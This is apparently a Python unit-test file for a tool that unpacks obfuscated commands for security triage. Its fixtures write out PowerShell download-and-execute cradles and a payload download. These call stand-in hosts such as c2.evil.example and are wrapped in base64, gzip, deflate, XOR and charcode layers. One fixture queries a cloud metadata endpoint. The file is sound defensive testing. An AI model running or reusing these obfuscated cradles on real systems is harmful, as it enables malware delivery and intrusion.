import base64
import gzip
import unittest
import zlib

from cmd_unmask import TriageConfig, unmask_command, unpack_dag


class TestBoundedUnpackingDagAndDecoders(unittest.TestCase):
    def test_base64_utf16le_unpadded_and_reconstructed_command(self) -> None:
        inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/stage1.ps1')"
        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii").rstrip("=")
        cmd = f"powershell.exe -NoP -W Hidden -enc {b64}"
        verdict = unmask_command(cmd)
        self.assertIn(inner, verdict.primary_unmasked_payload)
        self.assertIn("powershell.exe", verdict.primary_unmasked_payload)
        techniques = [step.technique for step in verdict.provenance_chain]
        self.assertTrue(any("base64" in t for t in techniques))

    def test_urlsafe_base64_and_gzip_stream_unpacking(self) -> None:
        inner = "Invoke-WebRequest -Uri https://c2.evil.example/payload.bin -OutFile C:\\Temp\\p.exe"
        compressed = gzip.compress(inner.encode("utf-8"))
        b64_urlsafe = base64.urlsafe_b64encode(compressed).decode("ascii").rstrip("=")
        cmd = (
            "$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String('"
            + b64_urlsafe
            + "')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
        )
        verdict = unmask_command(cmd)
        self.assertIn("https://c2.evil.example/payload.bin", verdict.primary_unmasked_payload)

    def test_deflate_stream_and_multilayer_interleaving(self) -> None:
        # Layer 2: expression obfuscation inside deflate-compressed base64
        inner_expr = "(\"{1}{0}\" -f 'Client','Net.Web') + ' http://deflate.evil.example/a'"
        raw_deflate = zlib.compress(inner_expr.encode("utf-8"))[2:-4]
        b64_deflate = base64.b64encode(raw_deflate).decode("ascii")
        cmd = f"p^o^w^e^r^s^h^e^l^l -c \"DeflateStream('{b64_deflate}')\""
        verdict = unmask_command(cmd)
        self.assertIn("Net.WebClient", verdict.primary_unmasked_payload)
        self.assertIn("http://deflate.evil.example/a", verdict.primary_unmasked_payload)

    def test_hex_url_and_charcode_decoders(self) -> None:
        hex_payload = b"powershell -c IEX(http://hex.evil.example/run.ps1)".hex()
        verdict_hex = unmask_command(f"cmd /c {hex_payload}")
        self.assertIn("http://hex.evil.example/run.ps1", verdict_hex.primary_unmasked_payload)

        url_cmd = "mshta.exe http%3A%2F%2Furl.evil.example%2Fpayload.hta"
        verdict_url = unmask_command(url_cmd)
        self.assertIn("http://url.evil.example/payload.hta", verdict_url.primary_unmasked_payload)

        charcodes = ",".join(str(ord(c)) for c in "powershell -c http://char.evil.example/x")
        verdict_char = unmask_command(f"fromCharCode({charcodes})")
        self.assertIn("http://char.evil.example/x", verdict_char.primary_unmasked_payload)

    def test_explicit_xor_and_fallback_single_byte_xor_bruteforce(self) -> None:
        plaintext = b"powershell.exe -nop -w hidden -c IEX(http://xor.evil.example/a.ps1)"
        key = 0x3A
        xored_b64 = base64.b64encode(bytes(b ^ key for b in plaintext)).decode("ascii")
        # Explicit -bxor syntax
        cmd_explicit = f"[Convert]::FromBase64String('{xored_b64}') | % {{ $_ -bxor 0x3A }}"
        verdict_exp = unmask_command(cmd_explicit)
        self.assertIn("http://xor.evil.example/a.ps1", verdict_exp.primary_unmasked_payload)

        # Fallback brute-force on high-entropy unannotated blob
        key2 = 0x55
        xored_b64_2 = base64.b64encode(bytes(b ^ key2 for b in plaintext)).decode("ascii")
        verdict_bf = unmask_command(f"powershell -c '{xored_b64_2}'")
        self.assertIn("http://xor.evil.example/a.ps1", verdict_bf.primary_unmasked_payload)

    def test_detection_rigidity_rejects_benign_words_and_enforces_resource_ceilings(self) -> None:
        benign = "git status && python -m unittest discover -s tests -v"
        dag_benign = unpack_dag(benign)
        self.assertEqual(len(dag_benign.nodes), 1)
        self.assertEqual(dag_benign.nodes[dag_benign.primary_leaf_id].text, benign)

        # Zip-bomb protection (max_stream_bytes ceiling)
        huge_payload = b"A" * 500_000
        bomb_b64 = base64.b64encode(gzip.compress(huge_payload)).decode("ascii")
        cfg = TriageConfig(max_stream_bytes=32_768)
        verdict_bomb = unmask_command(f"powershell -enc {bomb_b64}", config=cfg)
        self.assertTrue(any("stream" in w.lower() or "exceed" in w.lower() or "limit" in w.lower() for w in verdict_bomb.warnings))

    def test_decode_base64_embedded_in_delimited_identifiers(self) -> None:
        # Repro 1: Nessus pattern with '=' padding and '_' delimiter
        cmd1 = "echo nessus_cmd_Z2V0LWhlbHAgSW52b2tlLVJlc3RNZXRob2Q=_start"
        verdict1 = unmask_command(cmd1)
        self.assertTrue(any(step.technique == "base64_utf8" for step in verdict1.provenance_chain))
        self.assertTrue(any("get-help Invoke-RestMethod" in node.text for node in verdict1.dag.nodes.values()))

        # Repro 2: Second fixture without '=' padding delimited by '_'
        tok2 = "SW52b2tlLVJlc3RNZXRob2QgLU1ldGhvZCBHRVQgLUhlYWRlcnMgQHt9IGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvb3BjL3YxL2luc3RhbmNl"
        expected2 = "Invoke-RestMethod -Method GET -Headers @{} http://169.254.169.254/opc/v1/instance"
        cmd2 = f"echo nessus_cmd_{tok2}_start"
        verdict2 = unmask_command(cmd2)
        self.assertTrue(any("base64" in step.technique for step in verdict2.provenance_chain))
        self.assertTrue(any(expected2 in node.text for node in verdict2.dag.nodes.values()))

        # Delimited by '-' and ':'
        cmd_dash = "echo prefix-Z2V0LWhlbHAgSW52b2tlLVJlc3RNZXRob2Q=-suffix"
        verdict_dash = unmask_command(cmd_dash)
        self.assertTrue(any("get-help Invoke-RestMethod" in n.text for n in verdict_dash.dag.nodes.values()))

        cmd_colon = "echo token:Z2V0LWhlbHAgSW52b2tlLVJlc3RNZXRob2Q="
        verdict_colon = unmask_command(cmd_colon)
        self.assertTrue(any("get-help Invoke-RestMethod" in n.text for n in verdict_colon.dag.nodes.values()))

    def test_negative_ordinary_identifiers_and_paths_do_not_decode(self) -> None:
        negatives = [
            r"C:\Program_Files\Nessus_Agent\nessuscli.exe scan --config=default_config",
            "Get-Process -Name wazuh_agent_service -ErrorAction SilentlyContinue",
            "/usr/lib/systemd/system/wazuh_agent_auth.service",
            "some_identifier_with_underscores_and_no_base64_payload",
            "path_to_some_file_name_2026_10_22_log.txt",
        ]
        for cmd in negatives:
            v = unmask_command(cmd)
            self.assertEqual(len(v.dag.nodes), 1, f"Failed on negative command: {cmd}")
            self.assertEqual(v.provenance_chain, [])

    def test_warn_when_base64_input_appears_truncated(self) -> None:
        # Real QRadar case: EncodedCommand truncated mid-token ending in AFsARABsAGwASQBtAH
        cmd = "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgAFsARABsAGwASQBtAH"
        verdict = unmask_command(cmd)
        self.assertIn("Write-Host [DllIm", verdict.primary_unmasked_payload)
        self.assertTrue(
            any("truncated" in w.lower() and "base64" in w.lower() for w in verdict.warnings),
            f"Expected truncation warning in verdict.warnings, got: {verdict.warnings}",
        )

        # Truncated UTF-16 unit (odd byte count in Base64)
        raw_odd = "Write-Host [DllImport]".encode("utf-16le")[:-1]
        b64_odd = base64.b64encode(raw_odd).decode("ascii")
        cmd_odd = f"powershell.exe -enc {b64_odd}"
        verdict_odd = unmask_command(cmd_odd)
        self.assertTrue(
            any("truncated" in w.lower() and "base64" in w.lower() for w in verdict_odd.warnings),
            f"Expected truncation warning in verdict_odd.warnings, got: {verdict_odd.warnings}",
        )


if __name__ == "__main__":
    unittest.main()
